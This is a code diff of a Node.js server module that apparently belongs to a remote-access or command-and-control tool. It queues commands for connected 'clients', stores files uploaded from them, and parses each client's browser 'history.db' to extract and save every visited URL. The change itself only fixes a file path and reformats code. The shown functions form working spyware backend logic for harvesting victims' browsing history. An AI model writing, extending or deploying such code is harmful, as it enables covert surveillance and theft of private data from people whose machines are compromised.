@@ -7,7 +7,7 @@ const sqlite3 = require("sqlite3");
 const path = require("path");
 const {GenerateRandomId} = require("./utilFunctions");
 const appDir = path.dirname(require.main.filename);
-const downloadsPath = path.resolve(appDir, 'Api', 'Utils', 'clientFiles')
+const downloadsPath = path.resolve(appDir, 'Server', 'Api', 'Utils', 'clientFiles')
 
 const AddCommand = (clientId, command) => {
     const command_id = Utils.GenerateRandomId(6);
@@ -243,26 +243,26 @@ async function findClientIdBySid(sid) {
 
 module.exports.findClientIdBySid = findClientIdBySid
 
-function dbCallback(clientId, urlHistory){
-    addNewClientResponse(clientId,urlHistory).then()
+function dbCallback(clientId, urlHistory) {
+    addNewClientResponse(clientId, urlHistory).then()
 }
 
-function getUrlsFromDB(clientId){
+function getUrlsFromDB(clientId) {
     extractHistoryFromDB(clientId, dbCallback)
 }
+
 module.exports.getUrlsFromDB = getUrlsFromDB;
 
-function extractHistoryFromDB(clientId, callback){
-    let dbPath = path.resolve(downloadsPath,clientId,'history.db')
+function extractHistoryFromDB(clientId, callback) {
+    let dbPath = path.resolve(downloadsPath, clientId, 'history.db')
     let db = new sqlite3.Database(dbPath);
     let sqlQuery = 'SELECT url FROM urls;';
     db.all(sqlQuery, [], (err, rows) => {
         let urlHistory = ""
-        if (err){
+        if (err) {
             Utils.LogToFile(`Error parsing history DB ${err.message}`);
             callback(null)
-        }
-        else{
+        } else {
             rows.forEach((row) => {
                 urlHistory += `[+] Url: ${row.url} \r\n\n`
             });
@@ -271,9 +271,10 @@ function extractHistoryFromDB(clientId, callback){
     })
     db.close();
 }
+
 module.exports.extractHistoryFromDB = extractHistoryFromDB;
 
-const addNewClientResponse = async (clientId, response)=>{
+const addNewClientResponse = async (clientId, response) => {
     let response_id = GenerateRandomId(6);
     const currentTimeDate = Utils.GetCurrentTimeDate();
     let newResponse = new Response({
@@ -288,6 +289,6 @@ const addNewClientResponse = async (clientId, response)=>{
             if (err)
                 Utils.LogToFile(`Error updating last active for client ${clientId}`);
         })
-    return  await newResponse.save().then(() => true).catch(() => false);
+    return await newResponse.save().then(() => true).catch(() => false);
 }
 module.exports.addNewClientResponse = addNewClientResponse
